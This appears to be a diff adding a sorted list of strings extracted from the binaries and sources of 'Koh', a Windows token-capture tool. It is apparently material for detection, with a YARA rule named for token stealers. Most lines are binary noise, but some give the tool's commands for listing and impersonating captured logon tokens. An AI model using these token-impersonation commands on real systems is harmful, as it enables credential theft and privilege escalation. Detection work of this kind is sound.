+kUr=CA
+kernel32.dll
+kernelbase
+koh exit              - signals the Koh server to exit
+koh filter add S-1-5-21-<DOMAIN>-<RID>
+koh filter add SID    - adds a group SID for capture filtering
+koh filter list       - lists the group SIDs used for capture filtering
+koh filter remove SID - removes a group SID from capture filtering
+koh filter reset      - resets the SID group capture filter
+koh groups LUID       - lists the group SIDs for a captured token
+koh impersonate LUID  - impersonates the captured token with the give LUID
+koh list              - lists captured tokens
+koh release LUID      - releases the captured token for the specified LUID
+koh release all       - releases all captured tokens
+koh)
+koh-client)
+koh-server)
+l$ t$$V
+l$(33HD$ t
+l$(3C
+l$(L$
+l$@LD$D.
+l$hs $
+l$pHT$ 
+l(>>
+l8E3I
+l@6 
+lH8H8HL$ HT$(Ht
+le3HMH3H
+list
+loader.b64
+loader.bin
+loader.c
+loader.cs
+loader.hex
+loader.ps1
+loader.py
+loader.rb
+local static guard'
+local static thread guard'
+local vftable constructor closure'
+local vftable'
+localadmin (S-1-5-21-937929760-3187473010-80948926-1000)
+log10
+mG4>
+managed vector constructor iterator'
+managed vector copy constructor iterator'
+managed vector destructor iterator'
+misc
+mitigations)
+monitor
+mscoree
+mscoree.dll
+n      [
+n    [X] Error negotiating a token for LUID {session.Luid} (hToken: {hToken})
+n  Koh.exe <list 
+n  [
+nAuthPackage  : {sess.AuthPackage}
+nCaptureTime  : {sess.CaptureTime}
+nCredUserName : {sess.CredUser}
+nHHt
+nHMv
+nLUID         : {sess.Luid}
+nLogonType    : {sess.LogonType}
+nOrigin LUID  : {sess.OriginLUID}
+nUsername     : {sess.UserName} ({sess.SID})
+namespace Koh
+nan(ind)
+nan(snan)
+none
+ntdll.dll
+nz(wKgg
+oE4L
+obwQ4Y
+ole32
+ole32.dll
+oleaut32
+oleaut32.dll
+omni callsig'
+operator
+operator co_await
+operator<=>
+ot$ HX
+ot$ HXH
+ot$ HXf
+ot$ HXffffff
+ot$ HXfffffff
+our-approach)
+p)=m6W
+p.>E
+p:RRN
+p=QW
+pHD$8H
+pHEH
+pHHt
+parser)
+password
+password list
+pipe
+placement delete closure'
+placement delete[] closure'
+possible-approaches)
+pragma once
+pvLogonID
+q!-7
+qBJeD
+quick_exit
+r 3@PUD$(P
+r HHL$ c
+r!UD$
+r)HE
+r1HT$0HL$@
+r3H$
+r6T$DEHT$0EH
+r8MHt
+r<t8
+r>@8o
+rFBK
+rHHHGH
+rHT$ A
+rHd$ 
+rHd$8
+rIEUI AAL
+rIN MF(HH
+rJAA
+rWSxD$
+r[AL}]HI
+region APIs
+region enums
+region structs
+restrict(
+rl$4j
+rt$ D$
+rule HKTL_Koh_TokenStealer
+run process with 
+runas
+runas /netonly
+r}D.
+s credentials don't change and the system doesn
+s$IV
+s(P<
+s-AL
+s4fH
+s7IE
+s=3HIL
+sGHEU
+sID$89
+sIHL$ hHL$0HSy
+sPHL
+sW]A
+scHL5/=
+scalar deleting destructor'
+shell32
+shell32.dll
+sjHL5
+skHHH
+snHHH
+ss38
+string'
+syIE3H
+t <.u
+t D8
+t H$
+t HD$@x
+t HH
+t HIt
+t reboot.
+t require opening up a handle to multiple processes.
+t!=p
+t!A<s
+t!AI
+t!BD>E
+t!HD$0H
+t!HD$0H@
+t!HD$0HP
+t!HT$0H
+t!eH
+t!u3H$P
+t$  {
+t$ =
+t$$PT$((
+t$$S
+t$(3H
+t$(A
+t$(HD$ zz
+t$0EAIME
+t$0HD$(t$ _
+t$0L
+t$0T$LEIE
+t$<Lu
+t$<SxUSxx
+t$<Z
+t$DVP
+t$HH
+t$Lt
+t$UZH
+t$pH
+t$xLD$x
+t%@t
+t%@t !
+t%DIH
+t%DIH'$
+t%HD$PH
+t(DHcHT$PD
+t(HD$@x
+t(HH{
+t(HcD$PLL$(L
+t(Hj
+t(IBD
+t(LfD9
+t(eH
+t(u$H
+t)DH
+t-HD$@T$PT$XLL$PHT$XHD$ LD$ HL$H
+t-Ld$(E3LDd$ 33
+t.23f
+t.C@
+t.HD$@H
+t/Ht(HH
+t/K4y
+t0Ht)H
+t0L$0
+t0SOYu
+t1HIt%
+t1}@
+t2HD$
+t2HIt%
+t2Hd$@
+t2Hu
+t3HE
+t4HD$ 
+t4HL$0EHD$(IHL
+t4SH B
+t4t0HD$@M
+t4}xu]D}DEDmDeu
+t6HD$@x
+t6HL$PqD$ 
+t6ff
+t6t9
+t7HH
+t8L$h
+t9HAuAI
+t9t-Ht
+t9t/H
+t:MLMHt$0
+t<H$
+t=HD$0
+t=}D
+t>8Z
+t>H=
+t>HD$
+t@3<
+t@HD$(
+t@HIt4$
+tAHIt4$
+tAHt:HH
+tBD8 t
+tBHE
+tBHt
+tDHh
+tDLE3HU
+tD{ H
+tE33
+tE3t
+tF@u
+tGHD$ 
+tH3H
+tHD$(
+tHHO Hl$HH
+tHHO Hl$XH
+tHPtQtGH
+tI3L3H
+tI3t3Hd$ 
+tIHH
+tIgYHID
+tLHL$(
+tLHx0HOE3
+tMIHHHt
+tNE3EQ
+tNH$h
+tNHD$ H
+tOHH
+tRHL$8DI
+tSHItGH
+tTD$$H
+tTHD$(
+tTHH
+tTHItGH
+tTHtMHH
+tU@u
+tV<$
+tVHI
+t_HHA84.uH<=t5
+table-of-contents)
+tbD$ 
+tbHItV$
+tcHItV$
+tcHcD$(Hk
+tdH]HU
+teHh
+technical-background)
+technical-background) section of this README.
+testuser
+the-inline-shenanigans-bug)
+the-inline-shenanigans-bug)).
+threadToken)) {
+tjEteE3DE3BT
+tjH$
+tmHcH
+todo)
+trLs
+tuHItiH
+tu{8
+tvG8
+tvHItiH
+tvLL
+typedef struct {
+typeof'
+tzBD:A:tptlA
+tzIL
+u HD$0H
+u HD$PH
+u HcA<H
+u$u H
+u%A@
+u'AA
+u'HT$0HL$@<
+u(H$
+u(MHM3
+u-HT
+u-Hu
+u.H IuI
+u.HF
+u0H9Z
+u0HE
+u0HcH<H
+u2H(
+u3D$
+u3HcH<H
+u3Hu
+u6Hu
+u8HL$@
+u8u@
+u<H$
+u=H 
+u=HA
+u@7H_
+u@HIH
+u@USVWATAUAVAWH
+uAVS
+uBDHM
+uCH$
+uD$(HhHL$
+uDHMAB
+uDL$
+uEDd$8E
+uEL$
+uEt%}ss
+uEt'P
+uEt4P
+uEt6}ss
+uEtZP
+uEuHA
+uF8Z(t
+uH(=
+uH(u
+uH3-
+uHE0HELMHE8HELEC
+uHEHH
+uHH57_
+uHL$@
+uHMD
+uHcG(H
+uHcI
+uHcLG
+uHt7
+uIHHvWHD$(H
+uIHI
+uIHJ
+uIHK
+uIII
+uIIR
+uIIfH
+uIIg
+uIZH$
+uJHD$PH
+uJHd$H
+uKA - 
+uKtF
+uLHA
+uLMPA
+uMHL$@9
+uMt'IcHHBD
+uOHtE
+uQDD$0EtGLh
+uTH9Z
+uTHD$Px
+uTHL$8L$
+uUH9Z
+uUHEt
+u[3@8}t
+u[HA
+u]H$
+u]HItRtNH
+u]WD$
+u_HD$ H
+u_LHM
+uaL$
+ubHL$@'
+udHD$ H
+udt returning'
+ue!T$(H!T$ 
+ufE9
+ugHD$Px
+ugfD9A
+uiD@
+ukHD$(
+ul$4
+umW$
+unsigned char buf[] = 
+uoHC
+usage)
+usage-1)
+using System
+using System.Collections.Concurrent
+using System.Collections.Generic
+using System.ComponentModel
+using System.Diagnostics
+using System.IO
+using System.IO.Pipes
+using System.Linq
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Security.Principal
+using System.Text
+using System.Text.RegularExpressions
+using System.Threading
+utHe
+utHtoH
+utIM
+utfD9A
+uvHD$0x
+uwHIM
+uwHL$@
+uwu@}
+uyEHMLAEHMLAEHMLAwJL(LM3EH!D$ HHE
+uzH=e
+v2HND
+v4.0.30319
+vB8_(t
+vC8_(t
+vFHt
+vHEH
+vHG Hl$8H
+vMII
+vMILI
+vPAA
+vPD$
+vTI v.H
+vbase destructor'
+vbtable'
+vcall'
+veK4.IHI
+vector constructor iterator'
+vector copy constructor iterator'
+vector deleting destructor'
+vector destructor iterator'
+vector vbase constructor iterator'
+vector vbase copy constructor iterator'
+vftable'
+virtual displacement map'
+void go(char
+v{AEIA
+v{DAHhDD$p$
+w$EP
+w'3f9
+w.HA
+w.HB
+w/fy
+w0E9!tf
+w1HA
+w1HB
+w3Mu
+w4H 
+w5HA
+w>HA0Ht5HcP
+wAtjAH
+wD$D
+wE3AP
+wH(qE3H(
+wHL$ HHHL$ H
+wKHHv
+wTUV
+wdq=v/
+why-this-is-possible)
+will NOT
+wininet
+wininet.dll
+winlogon
+wldp
+wscript.exe
+x%02x
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x86 = Debug
+x86 = Release
+x86.ActiveCfg = Debug
+x86.ActiveCfg = Release
+x86.Build.0 = Debug
+x86.Build.0 = Release
+x8o2>Lj[
+x<D$0T$tRU
+x>LL$PA@
+xh2k
+xhD$ PF
+xpxxxx
+x}HD$0
+yAgt
+yC>O@L)>uzKs@>
+yDd$0
+yHK H
+yHs=nX
+y_(H
+ycg6fvPb
+yrvxyN
+zHD$pHE@HE
+zKG-wn@
+zO]3AOmm
+{ HC
+{4D5350C8-7F8C-47CF-8CDE-C752018AF17E}.Debug
+{4D5350C8-7F8C-47CF-8CDE-C752018AF17E}.Release
+{8CT
+{<itd<ntY<ot7<pt
+{PuGK(ADAPLh
+} datap
+} formatp
+}%E A
+}3AL
+}Dl$@
+}eSw S
+}fL3.
+}kDu
+}ss!EDDDuADu_DuVe
